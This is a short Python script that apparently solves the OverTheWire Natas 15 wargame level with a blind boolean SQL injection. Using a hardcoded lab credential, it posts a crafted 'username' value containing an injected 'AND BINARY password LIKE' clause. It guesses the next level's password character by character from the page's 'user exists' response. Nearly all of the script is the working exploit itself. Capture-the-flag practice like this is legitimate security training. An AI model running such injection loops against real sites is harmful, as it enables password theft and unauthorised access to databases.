#!/usr/bin/env python

import requests
import re
import string

characters = string.digits + string.ascii_lowercase + string.ascii_uppercase
print(characters)

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = f'http://{username}.natas.labs.overthewire.org/' 


session = requests.Session()
# response = session.get(url + 'index-source.html', auth=(username, password))
# content = response.text
# output = open('output.html', 'w')
# output.write(content)

seen_password = list()
while True:
    for ch in characters:
        
        print("trying with password", "".join(seen_password) + ch)
        
        response = session.post(url, data={
                        "username": 'natas16" AND BINARY password LIKE "' + "".join(seen_password) + ch + '%" # '}, auth=(username, password))

        content = response.text

        if ('user exists' in content):
            seen_password.append(ch)
            break


        

print(content)



